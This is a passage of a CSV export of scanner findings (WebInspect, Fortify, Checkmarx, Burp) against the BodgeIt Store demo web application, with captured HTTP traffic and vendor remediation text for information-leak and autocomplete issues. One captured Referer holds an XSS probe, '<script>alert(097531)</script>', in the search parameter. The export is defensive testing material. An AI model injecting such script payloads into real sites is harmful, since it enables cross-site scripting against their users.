width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Login</h3> Please enter your credentials: <br/><br/> <form method=""POST""> <center> <table> <tr> <td>Username:</td> <td><input id=""username"" name=""username""></input></td> </tr> <tr> <td>Password:</td> <td><input id=""password"" name=""password"" type=""password""></input></td> </tr> <tr> <td></td> <td><input id=""submit"" type=""submit"" value=""Login""></input></td> </tr> </table> </center> </form> If you dont have an account with us then please <a href=""register.jsp"">Register</a> now for a free account. <br/><br/> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","","","","",""
"DemoApps","","Bodgeit","19","System Information Leak: External","","Low","Open","2015-10-15","WebInspect","200","Information Exposure","","/bodgeit/password.jsp","","","http://localhost:8080/bodgeit/password.jsp","","GET /bodgeit/password.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/search.jsp?q=<script>alert(097531)</script> Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Crawl""; SID=""3D25211A7FDC43DDDA5C4DC17993384B""; PSID=""9505291F30F1E7340934ED21F83EAA69""; SessionType=""Crawl""; CrawlType=""HTML""; AttackType=""None""; OriginatingEngineID=""00000000-0000-0000-0000-000000000000""; AttributeName=""href""; Format=""NonRooted""; LinkKind=""HyperLink""; Locations=""HtmlNode""; Source=""ScriptExecution""; ThreadId=""113""; ThreadType=""CrawlBreadthFirstDBReader""; X-RequestManager-Memo: sid=""35""; smi=""0""; sc=""1""; ID=""b678c96c-e7f7-4515-a3f1-8cbb8e39c2e4""; X-Request-Memo: ID=""534f8fc4-e822-44c8-9d5f-1b6c45e68812""; sc=""2""; ThreadId=""58""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=04983762DE68DC128A91B28E7325BF01;b_id=3","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2397 Date: Thu, 15 Oct 2015 19:17:01 GMT <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Your profile</h3> Change your password: <br/><br/> <form method=""POST""> <center> <table> <tr> <td>Name</td> <td>null</td> </tr> <tr> <td>New Password:</td> <td><input id=""password1"" name=""password1"" type=""password""></input></td> </tr> <tr> <td>Repeat Password:</td> <td><input id=""password2"" name=""password2"" type=""password""></input></td> </tr> <tr> <td></td> <td><input id=""submit"" type=""submit"" value=""Submit""></input></td> </tr> </table> </center> </form> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","","","","",""
"DemoApps","","Bodgeit","5","Privacy Violation: Autocomplete","","Low","Open","2015-10-15","WebInspect","200","Information Exposure","","/bodgeit/register.jsp","","","http://localhost:8080/bodgeit/register.jsp","","GET /bodgeit/register.jsp HTTP/1.1 Referer: http://localhost:8080/bodgeit/login.jsp Accept: */* Pragma: no-cache Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0 Host: localhost:8080 Connection: Keep-Alive X-WIPP: AscVersion=10.50.327.10 X-Scan-Memo: Category=""Crawl""; SID=""A9B5975EFB1E426DD96C6BFB28F781A6""; PSID=""30A98F48B1D0C105232C2CC31D3672BE""; SessionType=""Crawl""; CrawlType=""HTML""; AttackType=""None""; OriginatingEngineID=""00000000-0000-0000-0000-000000000000""; AttributeName=""href""; Format=""NonRooted""; LinkKind=""HyperLink""; Locations=""HtmlNode""; Source=""ScriptExecution""; ThreadId=""120""; ThreadType=""CrawlBreadthFirstDBReader""; X-RequestManager-Memo: sid=""35""; smi=""0""; sc=""1""; ID=""132565ba-8aa3-4949-8db0-0f3ccb259e59""; X-Request-Memo: ID=""8c4ff9c6-ad56-4121-b532-479941221f55""; sc=""1""; ThreadId=""57""; Cookie: CustomCookie=WebInspect111919ZX5DC03815A4AB4C25AA4C639CA9ED0231YDB2C;JSESSIONID=04983762DE68DC128A91B28E7325BF01;b_id=3","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2493 Date: Thu, 15 Oct 2015 19:10:52 GMT <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Register</h3> Please enter the following details to register with us: <br/><br/> <form method=""POST""> <center> <table> <tr> <td>Username (your email address):</td> <td><input id=""username"" name=""username""></input></td> </tr> <tr> <td>Password:</td> <td><input id=""password1"" name=""password1"" type=""password""></input></td> </tr> <tr> <td>Confirm Password:</td> <td><input id=""password2"" name=""password2"" type=""password""></input></td> </tr> <tr> <td></td> <td><input id=""submit"" type=""submit"" value=""Register""></input></td> </tr> </table> </center> </form> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","","","","",""
"DemoApps","","Bodgeit","152","System Information Leak: Internal","","Low","Open","2015-10-15","Fortify SCA","200","Information Exposure","","root/dbconnection.jspf","","","http://localhost/root/dbconnection.jspf","","","","Abstract: <Content><Paragraph>The function <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> might reveal system data or debugging information by calling <Replace key=""PrimaryCall.name""/> on line <Replace key=""PrimaryLocation.line""/>. The information revealed by <Replace key=""PrimaryCall.name""/> could help an adversary form a plan of attack.<AltParagraph>Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.</AltParagraph></Paragraph></Content> Explanation: <Content>An internal information leak occurs when system data or debugging information is sent to a local file, console, or screen via printing or logging. <Paragraph> In this case <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> is called in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> <b>Example 1:</b> The following code prints an exception to the standard error stream: <pre> try { ... } catch (Exception e) { e.printStackTrace(); } </pre> Depending upon the system configuration, this information can be dumped to a console, written to a log file, or exposed to a user. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program. In the mobile world, information leaks are also a concern. <b>Example 2:</b> The code below logs the stack trace of a caught exception on the Android platform. <pre> ... try { ... } catch (Exception e) { Log.e(TAG, Log.getStackTraceString(e)); } ... </pre> </Content>","Recommendations: <Content>Write error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Be careful, debugging traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example). Even brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an ""Access Denied"" message can reveal that a file or user exists on the system.</Content> Tips: 1.Do not rely on wrapper scripts, corporate IT policy, or quick-thinking system administrators to prevent system information leaks. Write software that is secure on its own. 2.This category of vulnerability does not apply to all types of programs. For example, if your application executes on a client machine where system information is already available to an attacker, or if you print system information only to a trusted log file, you can use AuditGuide to filter out this category.","","",""
"DemoApps","","Bodgeit","174","System Information Leak: Internal","","Low","Open","2015-10-15","Fortify SCA","200","Information Exposure","","root/dbconnection.jspf","","","http://localhost/root/dbconnection.jspf","","","","Abstract: <Content><Paragraph>The function <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> might reveal system data or debugging information by calling <Replace key=""PrimaryCall.name""/> on line <Replace key=""PrimaryLocation.line""/>. The information revealed by <Replace key=""PrimaryCall.name""/> could help an adversary form a plan of attack.<AltParagraph>Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.</AltParagraph></Paragraph></Content> Explanation: <Content>An internal information leak occurs when system data or debugging information is sent to a local file, console, or screen via printing or logging. <Paragraph> In this case <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> is called in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> <b>Example 1:</b> The following code prints an exception to the standard error stream: <pre> try { ... } catch (Exception e) { e.printStackTrace(); } </pre> Depending upon the system configuration, this information can be dumped to a console, written to a log file, or exposed to a user. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program. In the mobile world, information leaks are also a concern. <b>Example 2:</b> The code below logs the stack trace of a caught exception on the Android platform. <pre> ... try { ... } catch (Exception e) { Log.e(TAG, Log.getStackTraceString(e)); } ... </pre> </Content>","Recommendations: <Content>Write error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Be careful, debugging traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example). Even brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an ""Access Denied"" message can reveal that a file or user exists on the system.</Content> Tips: 1.Do not rely on wrapper scripts, corporate IT policy, or quick-thinking system administrators to prevent system information leaks. Write software that is secure on its own. 2.This category of vulnerability does not apply to all types of programs. For example, if your application executes on a client machine where system information is already available to an attacker, or if you print system information only to a trusted log file, you can use AuditGuide to filter out this category.","","",""
"DemoApps","","Bodgeit","238","System Information Leak: Internal","","Low","Open","2015-10-15","Fortify SCA","200","Information Exposure","","root/dbconnection.jspf","","","http://localhost/root/dbconnection.jspf","","","","Abstract: <Content><Paragraph>The function <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> might reveal system data or debugging information by calling <Replace key=""PrimaryCall.name""/> on line <Replace key=""PrimaryLocation.line""/>. The information revealed by <Replace key=""PrimaryCall.name""/> could help an adversary form a plan of attack.<AltParagraph>Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.</AltParagraph></Paragraph></Content> Explanation: <Content>An internal information leak occurs when system data or debugging information is sent to a local file, console, or screen via printing or logging. <Paragraph> In this case <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> is called in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> <b>Example 1:</b> The following code prints an exception to the standard error stream: <pre> try { ... } catch (Exception e) { e.printStackTrace(); } </pre> Depending upon the system configuration, this information can be dumped to a console, written to a log file, or exposed to a user. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program. In the mobile world, information leaks are also a concern. <b>Example 2:</b> The code below logs the stack trace of a caught exception on the Android platform. <pre> ... try { ... } catch (Exception e) { Log.e(TAG, Log.getStackTraceString(e)); } ... </pre> </Content>","Recommendations: <Content>Write error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Be careful, debugging traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example). Even brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an ""Access Denied"" message can reveal that a file or user exists on the system.</Content> Tips: 1.Do not rely on wrapper scripts, corporate IT policy, or quick-thinking system administrators to prevent system information leaks. Write software that is secure on its own. 2.This category of vulnerability does not apply to all types of programs. For example, if your application executes on a client machine where system information is already available to an attacker, or if you print system information only to a trusted log file, you can use AuditGuide to filter out this category.","","",""
"DemoApps","","Bodgeit","148","System Information Leak: Internal","","Low","Open","2015-10-15","Fortify SCA","200","Information Exposure","","root/init.jsp","","","http://localhost/root/init.jsp","","","","Abstract: <Content><Paragraph>The function <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> might reveal system data or debugging information by calling <Replace key=""PrimaryCall.name""/> on line <Replace key=""PrimaryLocation.line""/>. The information revealed by <Replace key=""PrimaryCall.name""/> could help an adversary form a plan of attack.<AltParagraph>Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.</AltParagraph></Paragraph></Content> Explanation: <Content>An internal information leak occurs when system data or debugging information is sent to a local file, console, or screen via printing or logging. <Paragraph> In this case <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> is called in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> <b>Example 1:</b> The following code prints an exception to the standard error stream: <pre> try { ... } catch (Exception e) { e.printStackTrace(); } </pre> Depending upon the system configuration, this information can be dumped to a console, written to a log file, or exposed to a user. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program. In the mobile world, information leaks are also a concern. <b>Example 2:</b> The code below logs the stack trace of a caught exception on the Android platform. <pre> ... try { ... } catch (Exception e) { Log.e(TAG, Log.getStackTraceString(e)); } ... </pre> </Content>","Recommendations: <Content>Write error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Be careful, debugging traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example). Even brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an ""Access Denied"" message can reveal that a file or user exists on the system.</Content> Tips: 1.Do not rely on wrapper scripts, corporate IT policy, or quick-thinking system administrators to prevent system information leaks. Write software that is secure on its own. 2.This category of vulnerability does not apply to all types of programs. For example, if your application executes on a client machine where system information is already available to an attacker, or if you print system information only to a trusted log file, you can use AuditGuide to filter out this category.","","",""
"DemoApps","","Bodgeit","181","System Information Leak: Internal","","Low","Open","2015-10-15","Fortify SCA","200","Information Exposure","","root/init.jsp","","","http://localhost/root/init.jsp","","","","Abstract: <Content><Paragraph>The function <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> might reveal system data or debugging information by calling <Replace key=""PrimaryCall.name""/> on line <Replace key=""PrimaryLocation.line""/>. The information revealed by <Replace key=""PrimaryCall.name""/> could help an adversary form a plan of attack.<AltParagraph>Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.</AltParagraph></Paragraph></Content> Explanation: <Content>An internal information leak occurs when system data or debugging information is sent to a local file, console, or screen via printing or logging. <Paragraph> In this case <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> is called in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> <b>Example 1:</b> The following code prints an exception to the standard error stream: <pre> try { ... } catch (Exception e) { e.printStackTrace(); } </pre> Depending upon the system configuration, this information can be dumped to a console, written to a log file, or exposed to a user. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program. In the mobile world, information leaks are also a concern. <b>Example 2:</b> The code below logs the stack trace of a caught exception on the Android platform. <pre> ... try { ... } catch (Exception e) { Log.e(TAG, Log.getStackTraceString(e)); } ... </pre> </Content>","Recommendations: <Content>Write error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Be careful, debugging traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example). Even brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an ""Access Denied"" message can reveal that a file or user exists on the system.</Content> Tips: 1.Do not rely on wrapper scripts, corporate IT policy, or quick-thinking system administrators to prevent system information leaks. Write software that is secure on its own. 2.This category of vulnerability does not apply to all types of programs. For example, if your application executes on a client machine where system information is already available to an attacker, or if you print system information only to a trusted log file, you can use AuditGuide to filter out this category.","","",""
"DemoApps","","Bodgeit","232","System Information Leak: Internal","","Low","Open","2015-10-15","Fortify SCA","200","Information Exposure","","root/init.jsp","","","http://localhost/root/init.jsp","","","","Abstract: <Content><Paragraph>The function <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> might reveal system data or debugging information by calling <Replace key=""PrimaryCall.name""/> on line <Replace key=""PrimaryLocation.line""/>. The information revealed by <Replace key=""PrimaryCall.name""/> could help an adversary form a plan of attack.<AltParagraph>Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.</AltParagraph></Paragraph></Content> Explanation: <Content>An internal information leak occurs when system data or debugging information is sent to a local file, console, or screen via printing or logging. <Paragraph> In this case <Replace key=""PrimaryCall.name"" link=""PrimaryLocation""/> is called in <Replace key=""PrimaryLocation.file""/> at line <Replace key=""PrimaryLocation.line""/>. </Paragraph> <b>Example 1:</b> The following code prints an exception to the standard error stream: <pre> try { ... } catch (Exception e) { e.printStackTrace(); } </pre> Depending upon the system configuration, this information can be dumped to a console, written to a log file, or exposed to a user. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program. In the mobile world, information leaks are also a concern. <b>Example 2:</b> The code below logs the stack trace of a caught exception on the Android platform. <pre> ... try { ... } catch (Exception e) { Log.e(TAG, Log.getStackTraceString(e)); } ... </pre> </Content>","Recommendations: <Content>Write error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Be careful, debugging traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example). Even brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an ""Access Denied"" message can reveal that a file or user exists on the system.</Content> Tips: 1.Do not rely on wrapper scripts, corporate IT policy, or quick-thinking system administrators to prevent system information leaks. Write software that is secure on its own. 2.This category of vulnerability does not apply to all types of programs. For example, if your application executes on a client machine where system information is already available to an attacker, or if you print system information only to a trusted log file, you can use AuditGuide to filter out this category.","","",""
"DemoApps","","Bodgeit","602","Information_Exposure_Through_an_Error_Message","","Low","Open","2015-10-15","Checkmarx","209","Information Exposure Through an Error Message","A5","/bodgeit/root/admin.jsp","","","http://localhost/bodgeit/root/admin.jsp","","","","","","","",""
"DemoApps","","Bodgeit","335","Information_Exposure_Through_an_Error_Message","","Low","Open","2015-10-15","Checkmarx","209","Information Exposure Through an Error Message","A5","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","344","Information_Exposure_Through_an_Error_Message","","Low","Open","2015-10-15","Checkmarx","209","Information Exposure Through an Error Message","A5","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","549","Information_Exposure_Through_an_Error_Message","","Low","Open","2015-10-15","Checkmarx","209","Information Exposure Through an Error Message","A5","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","556","Information_Exposure_Through_an_Error_Message","","Low","Open","2015-10-15","Checkmarx","209","Information Exposure Through an Error Message","A5","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","578","Information_Exposure_Through_an_Error_Message","","Low","Open","2015-10-15","Checkmarx","209","Information Exposure Through an Error Message","A5","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","593","Information_Exposure_Through_an_Error_Message","","Low","Open","2015-10-15","Checkmarx","209","Information Exposure Through an Error Message","A5","/bodgeit/root/basket.jsp","","","http://localhost/bodgeit/root/basket.jsp","","","","","","","",""
"DemoApps","","Bodgeit","356","Information_Exposure_Through_an_Error_Message","","Low","Open","2015-10-15","Checkmarx","209","Information Exposure Through an Error Message","A5","/bodgeit/root/contact.jsp","","","http://localhost/bodgeit/root/contact.jsp","","","","","","","",""
"DemoApps","","Bodgeit","345","Information_Exposure_Through_an_Error_Message","","Low","Open","2015-10-15","Checkmarx","209","Information Exposure Through an Error Message","A5","/bodgeit/root/header.jsp","","","http://localhost/bodgeit/root/header.jsp","","","","","","","",""
"DemoApps","","Bodgeit","432","Information_Exposure_Through_an_Error_Message","","Low","Open","2015-10-15","Checkmarx","209","Information Exposure Through an Error Message","A5","/bodgeit/root/home.jsp","","","http://localhost/bodgeit/root/home.jsp","","","","","","","",""
"DemoApps","","Bodgeit","487","Information_Exposure_Through_an_Error_Message","","Low","Open","2015-10-15","Checkmarx","209","Information Exposure Through an Error Message","A5","/bodgeit/root/login.jsp","","","http://localhost/bodgeit/root/login.jsp","","","","","","","",""
"DemoApps","","Bodgeit","318","Information_Exposure_Through_an_Error_Message","","Low","Open","2015-10-15","Checkmarx","209","Information Exposure Through an Error Message","A5","/bodgeit/root/product.jsp","","","http://localhost/bodgeit/root/product.jsp","","","","","","","",""
"DemoApps","","Bodgeit","443","Information_Exposure_Through_an_Error_Message","","Low","Open","2015-10-15","Checkmarx","209","Information Exposure Through an Error Message","A5","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","639","Information_Exposure_Through_an_Error_Message","","Low","Open","2015-10-15","Checkmarx","209","Information Exposure Through an Error Message","A5","/bodgeit/root/register.jsp","","","http://localhost/bodgeit/root/register.jsp","","","","","","","",""
"DemoApps","","Bodgeit","659","Information_Exposure_Through_an_Error_Message","","Low","Open","2015-10-15","Checkmarx","209","Information Exposure Through an Error Message","A5","/bodgeit/root/score.jsp","","","http://localhost/bodgeit/root/score.jsp","","","","","","","",""
"DemoApps","","Bodgeit","481","Information_Exposure_Through_an_Error_Message","","Low","Open","2015-10-15","Checkmarx","209","Information Exposure Through an Error Message","A5","/bodgeit/root/search.jsp","","","http://localhost/bodgeit/root/search.jsp","","","","","","","",""
"DemoApps","","Bodgeit","367","Information_Exposure_Through_an_Error_Message","","Low","Open","2015-10-15","Checkmarx","209","Information Exposure Through an Error Message","A5","/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","http://localhost/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","","","","","",""
"DemoApps","","Bodgeit","577","Information_Exposure_Through_an_Error_Message","","Low","Open","2015-10-15","Checkmarx","209","Information Exposure Through an Error Message","A5","/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","http://localhost/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","","","","","",""
"DemoApps","","Bodgeit","605","Information_Exposure_Through_an_Error_Message","","Low","Open","2015-10-15","Checkmarx","209","Information Exposure Through an Error Message","A5","/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","http://localhost/bodgeit/src/com/thebodgeitstore/search/AdvancedSearch.java","","","","","","","",""
"DemoApps","","Bodgeit","56","Password field with autocomplete enabled","","Low","Open","2015-10-15","Burp Suite Pro","525","Information Exposure Through Browser Caching","","/bodgeit/login.jsp","","","http://localhost:8080/bodgeit/login.jsp","","GET /bodgeit/login.jsp HTTP/1.1 Host: localhost:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Referer: http://localhost:8080/bodgeit/ Cookie: JSESSIONID=09FC047A85CCCAD05A8F9B3FB787FF32","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2462 Date: Mon, 28 Mar 2016 20:11:06 GMT Connection: close <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a 